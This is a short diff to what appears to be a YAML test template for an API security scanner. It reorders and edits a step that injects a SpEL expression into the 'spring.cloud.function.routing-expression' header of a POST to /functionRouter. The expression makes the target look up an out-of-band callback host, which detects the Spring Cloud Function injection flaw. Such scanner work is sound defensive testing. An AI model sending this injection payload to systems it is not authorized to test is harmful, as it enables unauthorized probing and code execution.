@@ -40,12 +40,12 @@ execute:
     - req:
       - modify_method: POST
       - modify_url: "/functionRouter"
-      - add_header:
-          "spring.cloud.function.routing-expression": "T(java.net.InetAddress).getByName(\"https://test-services.akto.io/store_uuid/${random_uuid}\")"
       - modify_header:
           content-type: "application/x-www-form-urlencoded"
       - send_ssrf_req:
           url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+      - add_header:
+          "spring.cloud.function.routing-expression": "T(java.net.InetAddress).getByName(\"https://test-services.akto.io/${random_uuid}\")"
       - replace_body: 'YWRtaW46c2Rnc2Q='
 
 validate:
